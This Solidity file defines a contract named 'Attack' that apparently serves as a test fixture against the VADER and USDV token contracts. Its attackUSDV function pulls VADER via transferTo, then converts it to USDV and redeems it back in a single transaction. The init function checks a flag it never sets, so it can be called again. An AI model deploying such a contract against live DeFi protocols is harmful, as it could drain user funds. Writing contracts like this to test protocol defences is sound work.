// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.3;

// Interfaces
import "./iERC20.sol";
import "./iVADER.sol";
import "./iUSDV.sol";
import "./iROUTER.sol";

    //======================================VADER=========================================//
contract Attack {
    bool private inited;
    address public VADER;
    address public USDV;

    //=====================================CREATION=========================================//
    // Constructor
    constructor() {}

    function init(address _vader, address _USDV) public {
        require(inited == false);
        VADER = _vader;
        USDV = _USDV;
    }

    //========================================iERC20=========================================//
    function attackUSDV(uint amount) public {
        iERC20(VADER).transferTo(address(this), amount);
        iERC20(VADER).approve(USDV, amount);
        iUSDV(USDV).convertToUSDV(amount);
        iUSDV(USDV).redeemToVADER(amount);
    }
}